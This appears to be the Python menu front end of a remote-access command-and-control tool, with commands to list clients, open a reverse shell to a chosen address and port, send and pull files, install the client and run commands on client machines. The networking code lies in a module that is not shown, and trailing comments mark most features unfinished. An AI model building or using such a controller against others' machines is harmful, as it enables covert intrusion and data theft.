#!/usr/bin/python3
from front import admin


stayInProgram=True
res=False
commands = ['help','listClients','popShell', 'sendFile', 'reciveFile', 'execProgram', 'install','runComand', 'testServer','exit']

exit = 9

master=admin()

while stayInProgram :
    wait = True
    print (
        "List of commands:" + "\n\n" +
        "0 - help" + "\n" +
        "1 - listClients" +  "\n" +
        "2 - popShell"  + "\n" +
        "3 - sendFile"  + "\n" +
        "4 - reciveFile"  + "\n" +
        "5 - execProgram" +  "\n" +
        "6 - install"  + "\n" +
        "7 - runComand"  + "\n" +
        "8 - testServer"  + "\n" +
        "9 - exit"  + "\n"
    )
    command = exit;

    try : 
        command = int(input('Enter the number of command:'))
        if (command<0) or (command>exit):
            raise command
    except:
        print("The input is not validated\n")
        command = exit


    print ("The command selected is: " + commands[command])

    if (command == 0): #help
        print (
        "\n\nThe program is an administrator of several computers that act as clients of the server where that program is run."  + "\n\n" +
        "0 - help: describe the program and the commands of program " "\n\n" +
        "1 - listClients: list full clients." + "\n\n" + 
        "2 - popShell: runs a reverse shell." + "\n\n" + 
        "3 - sendFile: send a file to the client." + "\n\n" + 
        "4 - reciveFile: pull file from client." + "\n\n" + 
        "5 - execProgram: executable runs on the client machine." + "\n\n" + 
        "6 - install: install client application on client." + "\n\n" + 
        "7 - runComand: run a command on the client machine."  + "\n\n" +
        "8 - testServer: tests the connection to the server."  + "\n\n" +
        "9 - exit: disconnects of the server."  + "\n"
    )

    elif (command == 1): #listClients
        try:
            if not (master.displayClients()):
               raise master
        except:
            print("Returned Error!!")

    
    elif (command == 2): #popShell
        try:
            if not (master.displayClients()):
                raise master

            client = int(input("What client?"))
            print("\n")
            addres = input("what address?")
            print("\n")
            port = int(input("What port?"))
            print("\n")

            if not (master.abrirShell(client,addres,port)):
                raise master
        except:
            print("Returned Error!!")

    elif (command == 3): #sendFile
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            file = input("what file?")
            print("\n")

            if not (master.sendFile(file,client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 4): #reciveFile
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            file = input("what file?")
            print("\n")

            if not (master.downloadFile(file,client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 5): #execProgram
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            program = input("what file?")
            print("\n")

            if not (master.executeProgram(program,client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 6): #install
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")

            if not (master.install(client)):
                raise master
        except:
            print("Returned Error!!")


    elif (command == 7): #runComand
        try:
            if not (master.displayClients()):
                raise master
            
            client = int(input("What client?"))
            print("\n")
            comd = input("what command?")
            print("\n")

            if not (master.executeProgram(comd,client)):
                raise master
        except:
            print("Returned Error!!")
    
    elif (command == 8): #testServer
        try:
            if not(master.testServer()):
                raise master
        except:
            print("Returned Error!!")

    elif (command == exit): #exit
        stayInProgram = False
        wait = False
    
    else : #comando não descrito, nao deveria acontecer
        stayInProgram = False
        wait = False

    if (wait):
        input("\nPress enter for the next command")
        wait = False
    else:
        print("Finish the program")


#{listClients:ok,popShell:no,sendFile:no,reciveFile:no,execProgram:no,install:no,runComand:no,testServer:ok}
#lC:ok,pS:no,sF:no,rF:no,eP:no,i:no,rC:no,tS:ok
